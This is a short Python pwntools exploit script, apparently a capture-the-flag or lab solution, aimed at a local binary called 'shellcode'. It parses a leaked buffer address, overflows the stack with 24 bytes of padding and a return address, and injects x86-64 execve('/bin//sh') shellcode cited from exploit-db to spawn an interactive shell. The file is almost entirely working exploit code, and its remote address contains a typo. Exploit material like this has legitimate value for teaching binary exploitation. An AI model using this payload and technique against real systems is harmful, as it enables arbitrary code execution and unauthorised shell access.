#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
code = ELF('./shellcode')
local = 1
if local:
    p = process('./shellcode')
else:
    p = remote('127.0,0.1', 8888)
offset = 24
# https://www.exploit-db.com/exploits/36858/
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True)
buf_addr = int(buf_addr, 16)
payload = 'A' * offset + p64(buf_addr + 32) + shellcode
gdb.attach(p)
p.sendline(payload)
p.interactive()
